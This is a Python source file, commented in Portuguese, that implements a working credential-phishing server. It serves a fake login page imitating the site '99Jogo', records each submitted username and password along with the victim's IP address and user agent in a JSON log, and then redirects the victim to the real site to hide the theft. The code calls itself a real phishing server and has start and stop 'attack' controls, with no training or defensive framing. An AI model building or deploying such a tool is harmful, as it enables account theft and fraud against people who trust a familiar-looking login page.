
import http.server
import socketserver
import urllib.parse
from datetime import datetime
import json
import os
import threading
import time
import logging

logger = logging.getLogger(__name__)

# Configurações
PORT = 8080
LOG_FILE = "phishing_log.json"

class PhishingController:
    """Controlador para o servidor de phishing real."""
    
    def __init__(self):
        self.server_thread = None
        self.is_running = False
        self.target_url = None
        self.captured_credentials = []
        self._load_credentials()

    def _load_credentials(self):
        if os.path.exists(LOG_FILE):
            try:
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    self.captured_credentials = json.load(f)
            except Exception as e:
                logger.error(f"Erro ao carregar credenciais de {LOG_FILE}: {e}")
                self.captured_credentials = []
        else:
            self.captured_credentials = []

    def _log_credentials(self, username, password, ip_address, user_agent):
        """Salva as credenciais em um arquivo JSON e na memória."""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "password": password,
            "ip_address": ip_address,
            "user_agent": user_agent
        }
        
        self.captured_credentials.append(log_entry)
        
        try:
            with open(LOG_FILE, 'w', encoding='utf-8') as f:
                json.dump(self.captured_credentials, f, indent=2, ensure_ascii=False)
            logger.info(f"🎉 CREDENCIAIS CAPTURADAS: {username}:{password} (Salvas em {LOG_FILE})")
        except Exception as e:
            logger.error(f"Erro ao salvar credenciais: {e}")

    def start_attack(self, target_url):
        """Inicia o servidor de phishing em uma thread separada."""
        if self.is_running:
            return {"status": "error", "message": "Servidor de phishing já está rodando."}

        self.target_url = target_url
        
        # Criar uma classe Handler com acesso ao controller
        controller = self
        
        class PhishingHandler(http.server.SimpleHTTPRequestHandler):
            
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    
                    # Página de login falsa (simulando 99jogo)
                    html_content = f"""
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>99Jogo - Login</title>
                        <meta name="viewport" content="width=device-width, initial-scale=1">
                        <style>
                            body {{ background-color: #1a1a1a; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }}
                            .container {{ max-width: 350px; margin: 0 auto; background-color: #2c2c2c; padding: 20px; border-radius: 10px; }}
                            h1 {{ color: #ffcc00; }}
                            input[type=text], input[type=password] {{ width: 90%; padding: 10px; margin: 8px 0; display: inline-block; border: 1px solid #555; border-radius: 4px; box-sizing: border-box; background-color: #444; color: #fff; }}
                            button {{ background-color: #ffcc00; color: black; padding: 14px 20px; margin: 8px 0; border: none; border-radius: 4px; cursor: pointer; width: 90%; font-size: 16px; font-weight: bold; }}
                            button:hover {{ background-color: #e6b800; }}
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <h1>99Jogo</h1>
                            <p>Faça login para continuar</p>
                            <form method="POST" action="/login">
                                <input type="text" placeholder="Número do Celular/E-mail/Conta" name="username" required>
                                <input type="password" placeholder="Insira a senha" name="password" required>
                                <button type="submit">Login</button>
                            </form>
                        </div>
                    </body>
                    </html>
                    """
                    self.wfile.write(html_content.encode('utf-8'))
                else:
                    self.send_error(404)

            def do_POST(self):
                if self.path == '/login':
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    
                    parsed_data = urllib.parse.parse_qs(post_data.decode('utf-8'))
                    
                    username = parsed_data.get('username', [''])[0]
                    password = parsed_data.get('password', [''])[0]
                    
                    # Logar as credenciais usando o controller
                    controller._log_credentials(
                        username, 
                        password, 
                        self.client_address[0], 
                        self.headers.get('User-Agent', 'N/A')
                    )
                    
                    # Redirecionar para o site real
                    self.send_response(302)
                    self.send_header('Location', controller.target_url)
                    self.end_headers()
                else:
                    self.send_error(404)

        def run_server():
            try:
                with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
                    controller.httpd = httpd
                    controller.is_running = True
                    logger.info(f"Servidor de Phishing iniciado em http://0.0.0.0:{PORT}")
                    httpd.serve_forever()
            except Exception as e:
                logger.error(f"Erro ao iniciar servidor de Phishing: {e}")
                controller.is_running = False

        self.server_thread = threading.Thread(target=run_server)
        self.server_thread.daemon = True
        self.server_thread.start()
        
        return {"status": "running", "fake_url": f"http://localhost:{PORT}"}

    def stop_attack(self):
        """Para o servidor de phishing."""
        if self.is_running and self.httpd:
            self.httpd.shutdown()
            self.server_thread.join()
            self.is_running = False
            logger.info("Servidor de Phishing parado.")
            return {"status": "stopped", "message": "Servidor de phishing parado."}
        return {"status": "idle", "message": "Servidor de phishing não estava rodando."}

    def get_status(self):
        """Retorna o status e as credenciais capturadas."""
        return {
            "status": "running" if self.is_running else "idle",
            "target_url": self.target_url,
            "fake_url": f"http://localhost:{PORT}" if self.is_running else None,
            "captured_count": len(self.captured_credentials),
            "captured_credentials": self.captured_credentials
        }

# Renomear para PhishingHandler para manter a compatibilidade com a importação em server.py
PhishingHandler = PhishingController
